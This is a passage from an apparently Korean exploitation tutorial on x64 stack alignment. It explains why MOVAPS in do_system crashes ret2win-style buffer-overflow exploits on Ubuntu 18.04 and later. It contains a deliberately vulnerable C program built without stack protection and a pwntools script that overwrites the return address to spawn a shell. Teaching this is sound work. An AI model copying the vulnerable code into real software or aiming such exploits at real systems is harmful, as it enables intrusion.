cpu&amp;#xC5D0;&amp;#xC11C; SSE instruction&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xB54C;  stack alignment&amp;#xAC00; &amp;#xAE68;&amp;#xC838;&amp;#xC788;&amp;#xC73C;&amp;#xBA74; segmentation fault&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/12.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;a href=&#34;http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm&#34;&gt;MOVAPS&lt;/a&gt;&amp;#xAC00; &amp;#xBC14;&amp;#xB85C; SSE intruction &amp;#xC911; &amp;#xD558;&amp;#xB098;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. XMM &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB07C;&amp;#xB9AC; &amp;#xD639;&amp;#xC740; XMM &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC640; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC0AC;&amp;#xC774;&amp;#xC5D0;&amp;#xC11C; double quadword( 16byte ) &amp;#xD06C;&amp;#xAE30;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC62E;&amp;#xAE30;&amp;#xB294; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC778;&amp;#xB370;, &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; align &amp;#xC5EC;&amp;#xBD80;&amp;#xB97C; &amp;#xAC15;&amp;#xC81C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&amp;lt;do_system+&lt;span class=&#34;hljs-number&#34;&gt;364&lt;/span&gt;&amp;gt; movaps xmmword ptr [rsp + &lt;span class=&#34;hljs-number&#34;&gt;0x50&lt;/span&gt;], xmm0&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;XMM &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC640; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC0AC;&amp;#xC774;&amp;#xC5D0;&amp;#xC11C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC62E;&amp;#xAE38; &amp;#xB54C;, &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; align&amp;#xC774; &amp;#xAE68;&amp;#xC838;&amp;#xC788;&amp;#xC73C;&amp;#xBA74; general protection( #GP / SIGSEGV ) fault&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; Ubuntu 18.04&amp;#xBD80;&amp;#xD130; &amp;#xC774; movaps &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC774; &lt;code&gt;do_system()&lt;/code&gt;&amp;#xC744; &amp;#xD3EC;&amp;#xD568;&amp;#xD55C; &amp;#xC5EC;&amp;#xB7EC; &amp;#xBA40;&amp;#xD2F0;&amp;#xBBF8;&amp;#xB514;&amp;#xC5B4; &amp;#xC624;&amp;#xD37C;&amp;#xB808;&amp;#xC774;&amp;#xC158;&amp;#xC5D0; &amp;#xCD94;&amp;#xAC00;&amp;#xB418;&amp;#xC5B4; exploit&amp;#xC744; &amp;#xC791;&amp;#xC131;&amp;#xD560; &amp;#xB54C; stack alignment&amp;#xB97C; &amp;#xC2E0;&amp;#xACBD; &amp;#xC368;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;JMP-vs-CALL-vs-RET&#34;&gt;&lt;a href=&#34;#JMP-vs-CALL-vs-RET&#34; class=&#34;headerlink&#34; title=&#34;JMP vs CALL vs RET&#34;&gt;&lt;/a&gt;JMP vs CALL vs RET&lt;/h1&gt;&lt;p&gt;&amp;#xADF8;&amp;#xB798;&amp;#xC11C; Exploit&amp;#xC774;&amp;#xB791; stack align&amp;#xC774; &amp;#xAE68;&amp;#xC9C0;&amp;#xB294; &amp;#xAC70;&amp;#xB791; &amp;#xBB34;&amp;#xC2A8; &amp;#xC0C1;&amp;#xAD00;&amp;#xC778;&amp;#xB370;? &amp;#xADF8;&amp;#xB798;&amp;#xC11C; &amp;#xC65C; 16.04&amp;#xC5D0;&amp;#xC120; &amp;#xC258;&amp;#xC744; &amp;#xB744;&amp;#xC6B0;&amp;#xB358; &amp;#xACF5;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; 18.04&amp;#xBD80;&amp;#xD134; &amp;#xC791;&amp;#xB3D9; &amp;#xC548; &amp;#xD558;&amp;#xB294; &amp;#xAC74;&amp;#xB370;? &amp;#xC774;&amp;#xAC70;&amp;#xB97C; &amp;#xC774;&amp;#xD574;&amp;#xD558;&amp;#xB824;&amp;#xBA74; &amp;#xC6B0;&amp;#xC120; control intsruction&amp;#xB4E4;&amp;#xC758; &amp;#xCC28;&amp;#xC774;&amp;#xB97C; &amp;#xC54C;&amp;#xC544;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC0DD;&amp;#xAC01;&amp;#xBCF4;&amp;#xB2E4; &amp;#xBAA8;&amp;#xB974;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xC774; &amp;#xB9CE;&amp;#xB354;&amp;#xB77C;&amp;#xACE0;&amp;#x2026; &amp;#xAC01; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xB9C8;&amp;#xB2E4; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC758; &amp;#xBCC0;&amp;#xD654;, &amp;#xB354; &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xB9D0;&amp;#xD558;&amp;#xC790;&amp;#xBA74; RSP&amp;#xC758; &amp;#xBCC0;&amp;#xD654;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5A4;&amp;#xC9C0; &amp;#xC54C;&amp;#xC544;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;1-JMP&#34;&gt;&lt;a href=&#34;#1-JMP&#34; class=&#34;headerlink&#34; title=&#34;1. JMP&#34;&gt;&lt;/a&gt;1. JMP&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Transfers program control to a different point in the instruction stream &lt;strong&gt;without&lt;/strong&gt; recording &lt;strong&gt;return information&lt;/strong&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xB2E8;&amp;#xC21C;&amp;#xD788; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC758; &amp;#xD750;&amp;#xB984;&amp;#xC744; &amp;#xC62E;&amp;#xAE40;. &amp;#xC778;&amp;#xC6A9;&amp;#xAD6C;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xC54C;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC; &amp;#xB9AC;&amp;#xD134; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. jmp &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC73C;&amp;#xB85C; &amp;#xC778;&amp;#xD55C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC758; &amp;#xBCC0;&amp;#xD654;&amp;#xB294; &amp;#xC5C6;&amp;#xB2E4;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;2-CALL&#34;&gt;&lt;a href=&#34;#2-CALL&#34; class=&#34;headerlink&#34; title=&#34;2. CALL&#34;&gt;&lt;/a&gt;2. CALL&lt;/h2&gt;&lt;p&gt;&amp;#xBC18;&amp;#xBA74; call &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC740; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC758; &amp;#xD750;&amp;#xB984;&amp;#xC744; &amp;#xC62E;&amp;#xAE30;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; subroutine&amp;#xC5D0; &amp;#xC7A0;&amp;#xC2DC; &amp;#xB4E4;&amp;#xB800;&amp;#xB2E4;&amp;#xAC00; &amp;#xB3CC;&amp;#xC544;&amp;#xC624;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xB9AC;&amp;#xD134; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xADF8; &amp;#xB9AC;&amp;#xD134; &amp;#xC815;&amp;#xBCF4;&amp;#xB294; stack&amp;#xC5D0; push &amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; call &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD55C; &amp;#xB4A4;&amp;#xC5D4; RSP&amp;#xC758; &amp;#xAC12;&amp;#xC774; 8&amp;#xB9CC;&amp;#xD07C; &amp;#xAC10;&amp;#xC18C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/13.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe030&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;call hello &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC774; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74; &lt;main+18&gt;&amp;#xC744; stack&amp;#xC5D0; push &amp;#xD558;&amp;#xACA0;&amp;#xC8E0;?&lt;/main+18&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/14.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe028&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xC758; entry point&amp;#xC5D0;&amp;#xC120; RSP+8&amp;#xC774; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xAC00; &amp;#xB418;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xAF2D; &amp;#xAE30;&amp;#xC5B5;&amp;#xD558;&amp;#xC154;&amp;#xC57C; &amp;#xD560; &amp;#xAC83;&amp;#xC774; Call&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD55C; &amp;#xC9C1;&amp;#xD6C4;&amp;#xC5D4; &amp;#xC77C;&amp;#xC2DC;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; stack align&amp;#xC774; &amp;#xAE68;&amp;#xC9C4;&amp;#xB2E4;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;3-RET&#34;&gt;&lt;a href=&#34;#3-RET&#34; class=&#34;headerlink&#34; title=&#34;3. RET&#34;&gt;&lt;/a&gt;3. RET&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;pop rip
jmp rip&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;call&amp;#xC744; &amp;#xC124;&amp;#xBA85;&amp;#xD560; &amp;#xB54C; sub routine&amp;#xC5D0; &amp;#xC7A0;&amp;#xC2DC; &amp;#xB4E4;&amp;#xB800;&amp;#xB2E4; &amp;#xB3CC;&amp;#xC544;&amp;#xAC04;&amp;#xB2E4;&amp;#xACE0; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB3C;&amp;#xB860; &amp;#xC774; &amp;#xBAA8;&amp;#xB4E0; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; call&amp;#xC774; &amp;#xB2E4; &amp;#xD558;&amp;#xC9C4; &amp;#xC54A;&amp;#xACE0;, &amp;#xC6D0;&amp;#xB798;&amp;#xC758; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158; &amp;#xC2A4;&amp;#xD2B8;&amp;#xB9BC;&amp;#xC73C;&amp;#xB85C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xB3CC;&amp;#xC544;&amp;#xAC00;&amp;#xB294; &amp;#xB3D9;&amp;#xC791;&amp;#xC740;  ret&amp;#xC774; &amp;#xB300;&amp;#xC2E0;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;ret&amp;#xC740; &amp;#xB450; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC744; &amp;#xD558;&amp;#xB098;&amp;#xB85C; &amp;#xD569;&amp;#xCCD0; &amp;#xB1A8;&amp;#xB2E4;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB418;&amp;#xB294;&amp;#xB370;, call&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xD574;&amp;#xB193;&amp;#xC740; &amp;#xB9AC;&amp;#xD134; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0;&amp;#xC11C; &amp;#xBE7C;&amp;#xB0B4;&amp;#xC5B4; jmp &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC989;, RSP&amp;#xAC12;&amp;#xC774; 8&amp;#xB9CC;&amp;#xD07C; &amp;#xC99D;&amp;#xAC00;&amp;#xD55C;&amp;#xB2E4;&amp;#xB294; &amp;#xB73B;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/15.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe028&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9B0;&amp;#xC0F7;&amp;#xC740; ret&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xAE30; &amp;#xC9C1;&amp;#xC804;&amp;#xC758; &amp;#xC0C1;&amp;#xD669;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. RSP &amp;#xAC12;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xC2DC;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC; ret&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xAE30; &amp;#xC9C1;&amp;#xC804;&amp;#xC5D4; stack align&amp;#xC774; &amp;#xAE68;&amp;#xC838;&amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB294; &amp;#xD568;&amp;#xC218; &amp;#xC5D0;&amp;#xD544;&amp;#xB85C;&amp;#xADF8;&amp;#xC758; leave &amp;#xBA85;&amp;#xB839;&amp;#xC5B4; &amp;#xD639;&amp;#xC740; pop rbp&amp;#xC758; &amp;#xACB0;&amp;#xACFC;&amp;#xACA0;&amp;#xC8E0;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/16.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe030&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; ret&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; RSP&amp;#xAC00; 8&amp;#xB9CC;&amp;#xD07C; &amp;#xC99D;&amp;#xAC00;&amp;#xD558;&amp;#xACE0; stack align&amp;#xC774; &amp;#xB2E4;&amp;#xC2DC; &amp;#xB9DE;&amp;#xCDB0;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;&amp;#xC815;&amp;#xB9AC;&#34;&gt;&lt;a href=&#34;#&amp;#xC815;&amp;#xB9AC;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xC815;&amp;#xB9AC;&#34;&gt;&lt;/a&gt;&amp;#xC815;&amp;#xB9AC;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;call : RSP-=8 &amp;#x2192; &amp;#xC77C;&amp;#xC2DC;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; stack align&amp;#xC744; &amp;#xAE78;&lt;/li&gt;
&lt;li&gt;ret : RSP+=8 &amp;#x2192; leave &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB85C; &amp;#xAE68;&amp;#xC9C4; stack align&amp;#xC744; &amp;#xB2E4;&amp;#xC2DC; &amp;#xB9DE;&amp;#xCDA4;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Abnormal-call&#34;&gt;&lt;a href=&#34;#Abnormal-call&#34; class=&#34;headerlink&#34; title=&#34;Abnormal call&#34;&gt;&lt;/a&gt;Abnormal call&lt;/h1&gt;&lt;p&gt;&amp;#xC790; &amp;#xC774;&amp;#xCBE4; &amp;#xB418;&amp;#xBA74; &amp;#xB300;&amp;#xCDA9; &amp;#xB208;&amp;#xCE58;&amp;#xCC44;&amp;#xC168;&amp;#xC744; &amp;#xAC70; &amp;#xAC19;&amp;#xC740;&amp;#xB370;, BOF&amp;#xACF5;&amp;#xACA9;&amp;#xC744; &amp;#xD560; &amp;#xB54C; ret&amp;#xC73C;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xC8E0;? shellcode&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC74; &amp;#xB17C;&amp;#xC678;&amp;#xB85C; &amp;#xCE58;&amp;#xACE0;, ret2libc( RTL )&amp;#xB098; ROP&amp;#xB85C; BOF exploit&amp;#xC744; &amp;#xD558;&amp;#xAC8C; &amp;#xB420; &amp;#xD150;&amp;#xB370; call&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; ret&amp;#xC73C;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; stack alignment&amp;#xAC00; &amp;#xAE68;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB418;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;vuln-c&#34;&gt;&lt;a href=&#34;#vuln-c&#34; class=&#34;headerlink&#34; title=&#34;vuln.c&#34;&gt;&lt;/a&gt;vuln.c&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// vuln.c&lt;/span&gt;

&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
	system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;];
	
	read(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;);
	
	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}
$ gcc -o vuln vuln.c -no-pie -fno-&lt;span class=&#34;hljs-built_in&#34;&gt;stack&lt;/span&gt;-protector&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC815;&amp;#xB9D0; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; BOF &amp;#xC608;&amp;#xC81C;&amp;#xB85C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xC8E0;. vuln.c&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xACE0; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xD574;&amp;#xC90D;&amp;#xC2DC;&amp;#xB2E4;. BOF&amp;#xB97C; &amp;#xD560; &amp;#xAC70;&amp;#xB2C8;&amp;#xAE4C; &amp;#xB2F9;&amp;#xC5F0;&amp;#xD788; stack canary&amp;#xB294; &amp;#xD574;&amp;#xC81C;&amp;#xD574;&amp;#xC8FC;&amp;#xC138;&amp;#xC694;.&lt;/p&gt;
&lt;h2 id=&#34;bof-py&#34;&gt;&lt;a href=&#34;#bof-py&#34; class=&#34;headerlink&#34; title=&#34;bof.py&#34;&gt;&lt;/a&gt;bof.py&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# bof.py&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt;*

p = process(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;./vuln&amp;apos;&lt;/span&gt;)

gdb.attach(p)

win = &lt;span class=&#34;hljs-number&#34;&gt;0x401156&lt;/span&gt;

payload = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;A&amp;apos;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt; + p64(win)

p.sendline(payload)
p.interactive()
$ python3 bof.py&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;main()&lt;/code&gt;&amp;#xC758; return &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &lt;code&gt;win()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; entry point&amp;#xB85C; &amp;#xB36E;&amp;#xC5B4;&amp;#xC4F0;&amp;#xB294; &amp;#xACF5;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;Debug&#34;&gt;&lt;a href=&#34;#Debug&#34; class=&#34;headerlink&#34; title=&#34;Debug&#34;&gt;&lt;/a&gt;Debug&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/17.png&#34; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;pwndbg&amp;gt; bp main+45
pwndbg&amp;gt; c&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;main()&lt;/code&gt;&amp;#xC758; ret&amp;#xC5D0; break point&amp;#xB97C; &amp;#xAC78;&amp;#xACE0; &lt;code&gt;win()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &amp;#xD6C4;&amp;#xC758; stack &amp;#xC0C1;&amp;#xD669;&amp;#xC744; &amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/18.png&#34; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;pwndbg&amp;gt; ni&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ret&amp;#xC73C;&amp;#xB85C; &amp;#xD568;&amp;#xC218; &lt;code&gt;win()&lt;/code&gt;&amp;#xC758; entry point&amp;#xC5D0; &amp;#xB3C4;&amp;#xB2EC;&amp;#xD574;&amp;#xC11C; &amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xACE0; &amp;#xB098;&amp;#xBA74; stack alignment&amp;#xAC00; &amp;#xAE68;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/19.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xB294; stack&amp;#xC774; &amp;#xD56D;&amp;#xC0C1; align &amp;#xB3FC;&amp;#xC788;&amp;#xB2E4;&amp;#xACE0; &amp;#xAC00;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &amp;#xADF8; &amp;#xC0C1;&amp;#xD0DC;&amp;#xB97C; &amp;#xC720;&amp;#xC9C0;&amp;#xD558;&amp;#xB824;&amp;#xACE0; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC989;, &lt;code&gt;win()&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xAE68;&amp;#xC838;&amp;#xBC84;&amp;#xB9B0; alignment&amp;#xB97C; &amp;#xAE68;&amp;#xC9C4; &amp;#xC0C1;&amp;#xD0DC;&amp;#xB85C; &amp;#xC720;&amp;#xC9C0;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0;, &lt;code&gt;win()&lt;/code&gt; &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; stack alignment&amp;#xB294; &amp;#xAE68;&amp;#xC9C4; &amp;#xC0C1;&amp;#xD0DC;&amp;#xAC00; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/20.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xACB0;&amp;#xAD6D; &lt;code&gt;do_system()&lt;/code&gt;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB2E4; movaps&amp;#xC5D0; &amp;#xAC78;&amp;#xB824; segmentation fault&amp;#xB97C; &amp;#xB744;&amp;#xC6B0;&amp;#xACE0; exploit&amp;#xC740; &amp;#xC2E4;&amp;#xD328;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
